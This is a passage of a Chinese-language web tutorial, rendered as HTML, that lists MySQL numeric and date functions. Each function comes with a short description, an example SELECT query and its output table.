class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT 10 DIV 5;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 5 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>9.MOD(x,y)</strong></p><p>返回 x 除以 y 以后的余数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MOD(5,2);</span><br><span class="line">+----------+</span><br><span class="line">| MOD(5,2) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>10.EXP(x)</strong></p><p>返回 e 的 x 次方　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXP(3) ;</span><br><span class="line">+--------------------+</span><br><span class="line">| EXP(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>11.GREATEST(expr1, expr2, expr3, …)</strong></p><p>返回列表中的最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT GREATEST(3, 12, 34, 8, 25);</span><br><span class="line">+----------------------------+</span><br><span class="line">| GREATEST(3, 12, 34, 8, 25) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                         34 |</span><br><span class="line">+----------------------------+</span><br><span class="line">SELECT GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| Oracle                               |</span><br><span class="line">+--------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.LEAST(expr1, expr2, expr3, …)</strong></p><p>返回列表中的最小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEAST(3, 12, 34, 8, 25);</span><br><span class="line">+-------------------------+</span><br><span class="line">| LEAST(3, 12, 34, 8, 25) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       3 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.MAX(expression)</strong></p><p>返回字段 expression 中的最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MAX(Price) AS LargestPrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| LargestPrice |</span><br><span class="line">+--------------+</span><br><span class="line">|          789 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.MIN(expression)</strong></p><p>返回字段 expression 中的最小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MIN(Price) AS MinPrice FROM Products;</span><br><span class="line">+----------+</span><br><span class="line">| MinPrice |</span><br><span class="line">+----------+</span><br><span class="line">|      123 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>15.对数计算</strong></p><p>LOG(x)  返回数字的自然对数，以 e 为底。</p><p>LOG(n, x)  返回以n为底，数字x的对数。</p><p>LOG2(x)  返回以 2 为底的对数。</p><p>LOG10(x)   返回以 10 为底的对数。</p><p><strong>16.PI()</strong></p><p>返回圆周率(3.141593）</p><p><strong>17.POW(x,y)  | POWER(x,y)</strong></p><p>返回 x 的 y 次方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT POW (2,3);</span><br><span class="line">+-----------+</span><br><span class="line">| POW (2,3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         8 |</span><br><span class="line">+-----------+</span><br><span class="line">SELECT POWER(2,3);</span><br><span class="line">+------------+</span><br><span class="line">| POWER(2,3) |</span><br><span class="line">+------------+</span><br><span class="line">|          8 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>18.RADIANS(x)</strong></p><p>将角度转换为弧度　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RADIANS(180);</span><br><span class="line">+-------------------+</span><br><span class="line">| RADIANS(180)      |</span><br><span class="line">+-------------------+</span><br><span class="line">| 3.141592653589793 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>19.RAND()</strong></p><p>返回 0 到 1 的随机数　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RAND();</span><br><span class="line">+--------------------+</span><br><span class="line">| RAND()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 0.8029554586885083 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>20.ROUND(x)</strong></p><p>返回离 x 最近的整数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ROUND(1.49999999999);</span><br><span class="line">+----------------------+</span><br><span class="line">| ROUND(1.49999999999) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT ROUND(1.5);</span><br><span class="line">+------------+</span><br><span class="line">| ROUND(1.5) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>21.SIGN(x)</strong></p><p>返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SIGN(-1);</span><br><span class="line">+----------+</span><br><span class="line">| SIGN(-1) |</span><br><span class="line">+----------+</span><br><span class="line">|       -1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>22.SQRT(x)</strong></p><p>返回x的平方根　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SQRT(4);</span><br><span class="line">+---------+</span><br><span class="line">| SQRT(4) |</span><br><span class="line">+---------+</span><br><span class="line">|       2 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>23.SUM(expression)</strong></p><p>返回指定字段的总和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(Price) FROM Products;</span><br><span class="line">+------------+</span><br><span class="line">| SUM(Price) |</span><br><span class="line">+------------+</span><br><span class="line">|       1368 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>24.TRUNCATE(x,y)</strong></p><p>返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRUNCATE(1.23456,3);</span><br><span class="line">+---------------------+</span><br><span class="line">| TRUNCATE(1.23456,3) |</span><br><span class="line">+---------------------+</span><br><span class="line">|               1.234 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-日期函数"><a href="#MySQL-日期函数" class="headerlink" title="MySQL 日期函数"></a>MySQL 日期函数</h2><p><strong>1.ADDDATE(d,n)</strong></p><p> 计算起始日期 d 加上 n 天的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDDATE(&#39;2020-2-1&#39;,30);</span><br><span class="line">+------------------------+</span><br><span class="line">| ADDDATE(&#39;2020-2-1&#39;,30) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 2020-03-02             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>2.ADDTIME(t,n)</strong></p><p>n 是一个时间表达式，时间 t 加上时间表达式 n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| 2020-11-11 00:00:00                    |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.DATE_ADD(d，INTERVAL expr type)</strong></p><p>计算起始日期 d 加上一个时间段后的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE);</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE) |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| 2020-11-11 11:16:11                                |</span><br><span class="line">+----------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.当前日期时间</strong></p><p>CURDATE()  |   CURRENT_DATE()   返回当前日期</p><p>CURTIME()  |    CURRENT_TIME     返回当前时间</p><p>NOW()  |  CURRENT_TIMESTAMP()  |  LOCALTIME()  |LOCALTIMESTAMP()   |  SYSDATE()  返回当前日期和时间</p><p><strong>5.DATE(t)  |  HOUR(t)  |  MINUTE(t)  |SECOND(t)</strong></p><p>从日期或日期时间表达式中提取日期值|小时值|分钟值|秒钟值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE(&#39;2020-11-11 0:0:0&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DATE(&#39;2020-11-11 0:0:0&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| 2020-11-11               |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.DATEDIFF(d1,d2)</strong></p><p>计算日期 d1-&gt;d2 之间相隔的天数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                              -197 |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.DATE_FORMAT(d,f)</strong></p><p> 按表达式 f的要求显示日期 d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;);</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| 2011-11-11 11:11:11 AM                           |</span><br><span class="line">+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.DATE_SUB(date,INTERVAL expr type)</strong></p><p>函数从日期减去指定的时间间隔。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> select * from Orders;</span><br><span class="line">+---------+------------+</span><br><span class="line">| OrderId | OrderDate  |</span><br><span class="line">+---------+------------+</span><br><span class="line">|       1 | 2020-11-11 |</span><br><span class="line">+---------+------------+</span><br><span class="line">SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders;</span><br><span class="line">+---------+--------------+</span><br><span class="line">| OrderId | OrderPayDate |</span><br><span class="line">+---------+--------------+</span><br><span class="line">|       1 | 2020-11-09   |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure><p><strong>9.DAY(d)</strong></p><p>返回日期值 d 的日期部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DAY(&#39;2020-11-11&#39;) AS day;</span><br><span class="line">+------+</span><br><span class="line">| day  |</span><br><span class="line">+------+</span><br><span class="line">|   11 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p><strong>10.DAYNAME(d)</strong></p><p>返回日期 d 是星期几，如 Monday,Tuesday</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| DAYNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Wednesday             |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>11.DAYOFYEAR(d)</strong></p><p> 计算日期 d 是本年的第几天</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYOFYEAR (&#39;2020-11-11&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DAYOFYEAR (&#39;2020-11-11&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                      316 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.EXTRACT(type FROM d)</strong></p><p>从日期 d 中获取指定的值，type 指定返回的值。<br>type可取值为：</p><ul><li>MICROSECOND</li><li>SECOND</li><li>MINUTE</li><li>HOUR</li><li>DAY</li><li>WEEK</li><li>MONTH</li><li>QUARTER</li><li>YEAR</li><li>SECOND_MICROSECOND</li><li>MINUTE_MICROSECOND</li><li>MINUTE_SECOND</li><li>HOUR_MICROSECOND</li><li>HOUR_SECOND</li><li>HOUR_MINUTE</li><li>DAY_MICROSECOND</li><li>DAY_SECOND</li><li>DAY_MINUTE</li><li>DAY_HOUR</li><li>YEAR_MONTH</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                         11 |</span><br><span class="line">+--------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.FROM_DAYS(n)</strong></p><p>计算从 0000 年 1 月 1 日开始 n 天后的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FROM_DAYS(9999);</span><br><span class="line">+-----------------+</span><br><span class="line">| FROM_DAYS(9999) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 0027-05-18      |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>14.TO_DAYS(d)</strong></p><p>计算日期 d 距离 0000 年 1 月 1 日的天数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TO_DAYS(&#39;0027-05-18&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| TO_DAYS(&#39;0027-05-18&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                  9999 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LAST_DAY(d)</strong></p><p>返回给定日期的那一月份的最后一天</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LAST_DAY(&#39;2020-2-1&#39;);</span><br><span class="line">+----------------------+</span><br><span class="line">| LAST_DAY(&#39;2020-2-1&#39;) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2020-02-29           |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>16.MAKEDATE(year, day-of-year)</strong></p><p>基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKEDATE(2020,300);</span><br><span class="line">+--------------------+</span><br><span class="line">| MAKEDATE(2020,300) |</span><br><span class="line">+--------------------+</span><br><span class="line">| 2020-10-26         |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>17.MAKETIME(hour, minute, second)</strong></p><p>组合时间，参数分别为小时、分钟、秒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKETIME(1,2,3);</span><br><span class="line">+-----------------+</span><br><span class="line">| MAKETIME(1,2,3) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 01:02:03        |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>18.MONTHNAME(d)</strong></p><p>返回日期当中的月份名称，如 November</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MONTHNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| MONTHNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| November                |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>19.PERIOD_ADD(period, number)</strong></p><p>为 年-月 组合日期添加一个时段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT PERIOD_ADD(202011,7);</span><br><span class="line">+----------------------+</span><br><span class="line">| PERIOD_ADD(202011,7) |</span><br><span class="line">+----------------------+</span><br><span class="line">|               202106 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>20.PERIOD_DIFF(period1, period2)</strong></p><p>返回两个时段之间的月份差值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT PERIOD_DIFF(202011,202109);</span><br><span class="line">+----------------------------+</span><br><span class="line">| PERIOD_DIFF(202011,202109) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                        -10 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.TIMEDIFF(time1, time2)</strong></p><p>计算时间差值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| -03:03:03                 |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>22.QUARTER(d)</strong></p><p>返回日期d是第几季节，返回 1 到 4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT QUARTER(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| QUARTER(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     4 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>23.SEC_TO_TIME(s)</strong></p><p>将以秒为单位的时间 s 转换为时分秒的格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SEC_TO_TIME(9999);</span><br><span class="line">+-------------------+</span><br><span class="line">| SEC_TO_TIME(9999) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 02:46:39          |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>24.TIME_TO_SEC(t)</strong></p><p>将时间 t 转换为秒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME_TO_SEC(&#39;02:46:39&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| TIME_TO_SEC(&#39;02:46:39&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                    9999 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>25.STR_TO_DATE(string, format_mask)</strong></p><p>将字符串转变为日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| 2020-11-11                                  |</span><br><span class="line">+---------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>26.SUBDATE(d,n)</strong></p><p> 日期 d 减去 n 天后的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 2019-11-11 11:11:11                 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>27.SUBTIME(t,n)</strong></p><p>时间 t 减去 n 秒的时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 2020-11-11 11:11:00                |</span><br><span class="line">+------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>28.TIME(expression)</strong></p><p>提取传入表达式的时间部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME(&#39;2020-11-11 19:30:00&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| TIME(&#39;2020-11-11 19:30:00&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 19:30:00                    |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>29.TIME_FORMAT(t,f)</strong></p><p>按表达式 f 的要求显示时间 t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 11:11:11 AM                  |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>30.WEEK(d)</strong></p><p>计算日期 d 是本年的第几个星期，范围是 0 到 53</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT WEEK(&#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| WEEK(&#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|                          45 |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-高级函数"><a href="#MySQL-高级函数" class="headerlink" title="MySQL 高级函数"></a>MySQL 高级函数</h2><p><strong>1.BIN(x)  |  OCT(x)  |  HEX(x)</strong></p><p>返回 x 的二进制编码|八进制编码|十六进制编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 